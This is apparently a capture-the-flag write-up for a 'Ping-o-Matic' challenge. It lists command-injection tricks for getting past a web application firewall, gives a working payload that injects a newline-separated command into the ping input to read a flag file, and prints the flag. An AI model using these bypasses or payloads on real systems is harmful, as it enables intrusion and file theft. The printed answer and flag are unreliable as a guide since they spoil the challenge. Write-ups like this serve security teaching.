# Ping-o-Matic - Hard Mode

## Vulnerability
Command Injection with WAF bypass

## WAF Bypass Techniques

1. Space bypass: Use %20 or ${IFS}
2. Command separator: Use %0a (newline) instead of ;
3. Keyword bypass: Use wildcards /f???.??? instead of /flag.txt
4. Command choice: Use sort instead of cat (not blocked)

## Working Payload

127.0.0.1%0asort%20/f???.???

## Flag

INFODAYS{CMD_INJ3CT10N_W4F_BYP4SS_2026}
